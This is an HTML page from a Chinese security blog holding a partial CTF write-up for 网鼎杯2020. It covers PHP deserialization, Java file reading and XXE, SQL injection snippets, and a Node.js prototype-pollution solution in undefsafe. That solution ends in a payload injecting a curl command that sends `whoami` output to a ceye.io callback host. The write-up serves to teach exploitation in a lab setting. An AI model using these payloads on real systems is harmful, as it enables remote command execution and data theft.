@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            网鼎杯2020 部分Writeup
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#AreUSerialz"><span class="toc-text">AreUSerialz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FileJava"><span class="toc-text">FileJava</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#trace"><span class="toc-text">trace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#notes"><span class="toc-text">notes</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <p>被虚幻拿到MISC卡了很久，只做了一道nodejs题，详细记录一下。同时加上其他题目的笔记</p>
+<h2 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h2><ul>
+<li><p>PHP7的反序列化下可以使用public调用protected和private属性<a target="_blank" rel="noopener" href="https://github.com/php/php-src/commit/7cb5bdf64a95bd70623d33d6ea122c13b01113bd">参考</a></p>
+</li>
+<li><p>可以将序列化的数据类型从s改成S，php反序列化时会对数据进行解码。如<code>%00 ⇒ \00</code> <a target="_blank" rel="noopener" href="https://xuptsec.github.io/2018/09/18/%E4%BB%8ESQLi%E5%88%B0RCE-ecshop-2-x-3-x%E6%97%A0%E9%99%90%E5%88%B6getshell/">参考</a></p>
+</li>
+<li><p>读不了Flag</p>
+<ol>
+<li><p>php.ini中设置了include_path</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; UNIX: &quot;/path1:/path2&quot;</span><br><span class="line">;include_path = &quot;.:/php/includes&quot;</span><br><span class="line">;</span><br><span class="line">; Windows: &quot;\path1;\path2&quot;</span><br><span class="line">;include_path = &quot;c:\php\includes&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看Apache配置文件（/etc/httpd/conf/httpd.conf）查看默认目录，再默认目录+文件名进行读取</p>
+</li>
+<li><p>题目中其他暗示</p>
+</li>
+</ol>
+</li>
+</ul>
+<a id="more"></a>
+
+<h2 id="FileJava"><a href="#FileJava" class="headerlink" title="FileJava"></a>FileJava</h2><ul>
+<li><p>Java题目环境可以尝试读取WEB-INF/web.xml获取servlet信息<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_19782019/article/details/80292110">参考</a></p>
+<p>  例如servlet是：<code>cn.abc.servlet.DownloadServlet</code></p>
+<p>  它的相对地址：<code>WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</code></p>
+<p>  反编译后可以得到源码</p>
+</li>
+<li><p>可以利用EXCEL内的xl/workbook.xml进行XXE(压缩时注意环境问题) <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3741">参考</a></p>
+</li>
+</ul>
+<h2 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h2><ul>
+<li>既报错又延迟</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">1</span>,<span class="keyword">pow</span>(<span class="number">9999</span>,<span class="number">100</span>) <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="number">3</span>));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>无列名注入</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 借助union</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> userinfo;</span><br><span class="line"></span><br><span class="line">// 之后查询单个列</span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">`3`</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> userinfo)a;</span><br><span class="line">// 过滤``，使用别名绕过</span><br><span class="line">~~S~~ELECT b FROM (<span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">AS</span> b,<span class="number">4</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> userinfo)a;</span><br><span class="line"></span><br><span class="line">// 查询多个列</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">concat</span>(<span class="string">`2`</span>,<span class="number">0x3a</span>,<span class="string">`3`</span>) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> userinfo)a <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h2><p>直接本地运行会报错，没有模板文件。可以把输出的内容直接输出到页面上。修改后的源码如下：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.owner = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">write_note</span>(<span class="params">author, raw_note</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.note_list[(<span class="built_in">this</span>.num++).toString()] = &#123;<span class="string">&quot;author&quot;</span>: author,<span class="string">&quot;raw_note&quot;</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">get_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="built_in">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">edit_note</span>(<span class="params">id, author, raw</span>)</span> &#123;</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">get_all_notes</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">remove_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="built_in">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">&quot;nobody&quot;</span>, <span class="string">&quot;this is nobody&#x27;s first note&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加笔记</span></span><br><span class="line">app.route(<span class="string">&#x27;/add_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.send(<span class="string">&quot;please post&quot;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.send(<span class="string">&quot;susccess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编辑笔记</span></span><br><span class="line">app.route(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.send(<span class="string">&quot;please post&quot;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="built_in">console</span>.log(id, author, enote);</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.send(<span class="string">&quot;susccess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除笔记</span></span><br><span class="line">app.route(<span class="string">&#x27;/delete_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.send(<span class="string">&quot;please post&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.send(<span class="string">&quot;susccess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看所有笔记 传入q</span></span><br><span class="line">app.route(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(a_note)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看status</span></span><br><span class="line">app.route(<span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(commands[index]);</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">&#x27;Sorry cant find that!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">&#x27;Something broke!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure>
+
+<p>在源码中可以看到执行命令的语句，但是传入的参数不是直接可控的。很明显要原型链污染到传入执行语句中的变量才行。</p>
+<p>出现问题的是undefsafe这个包，在google当中直接搜到了它的原型链污染文章：</p>
+<p><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/remy/undefsafe/commit/f272681b3a50e2c4cbb6a8533795e1453382c822">https://github.com/remy/undefsafe/commit/f272681b3a50e2c4cbb6a8533795e1453382c822</a></p>
+<p>需要注意的是：我在本地测试拉下来的undefsafe包都没法复现，可以下载一个最新的包然后直接把相关代码删除就可以，参考github上面的commit。</p>
+<p>回到题目，源码当中存在问题的是：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">edit_note</span>(<span class="params">id, author, raw</span>)</span> &#123;</span><br><span class="line">    undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">    undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以在这里传入id为<code>__proto__</code>，然后污染变量。这里存在一个坑，不能直接污染commands。在本地可以执行的payload，放在题目环境中就不行。可以直接污染<code>__proto__</code>，后面遍历commands的时候还是可以遍历的到。原因这里详细记录一下：</p>
+<p>在nodejs原型链中，不同对象所生成的原型链如下(部分)：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// o对象直接继承了Object.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;yo&quot;</span>, <span class="string">&quot;whadup&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"><span class="comment">// 数组都继承于 Array.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数都继承于 Function.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure>
+
+<p>题目中可以污染的是this.note_list这个对象，他的原型链是<code>this.note_list ---&gt; Object.prototype ---&gt; null</code>(commands也是一样)。正好就污染了Object的prototype属性（即原型）。</p>
+<p>后面在遍历commands的过程中，会把commands的原型所包含的属性也遍历出来。测试例子：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">note_list = &#123;&#125;;</span><br><span class="line">note_list.__proto__.test = <span class="string">&quot;Hello World&quot;</span>; <span class="comment">// undefsafe所污染的地方</span></span><br><span class="line">commands = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(index);</span><br><span class="line">	<span class="built_in">console</span>.log(commands[index]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/05/12/qtKxfIiDY9bks4T.png" alt="Untitled.png"></p>
+<p>于是乎，我们就可以构造payload了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;__proto__&amp;author&#x3D;curl%20%22http%3A%2F%2Fxxx.ceye.io%2F%22%2B%60whoami%60&amp;raw&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p>在/edit_notes这里post发包：</p>
+<p><img src="https://i.loli.net/2020/05/12/jSGOdCUi2JqTgLV.png" alt="Untitled 1.png"></p>
+<p>访问/status之后在拿到flag：</p>
+<p><img src="https://i.loli.net/2020/05/12/VXLb84QeckIgOEh.png" alt="Untitled 2.png"></p>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
